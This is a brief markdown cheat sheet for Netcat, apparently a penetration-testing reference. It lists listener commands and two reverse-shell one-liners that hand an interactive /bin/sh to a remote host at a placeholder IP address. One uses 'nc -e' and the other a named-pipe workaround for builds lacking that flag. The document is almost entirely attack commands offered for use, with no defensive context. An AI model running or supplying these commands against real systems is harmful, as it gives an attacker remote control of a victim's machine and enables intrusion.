# Netcat

## Listener
nc -l -p 4444 \
nc -lnvp 4444

## Reverse TCP
nc -e /bin/sh xxx.xxx.x.xx 4444

## Reverse TCP ( If missing -e argument )  

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f
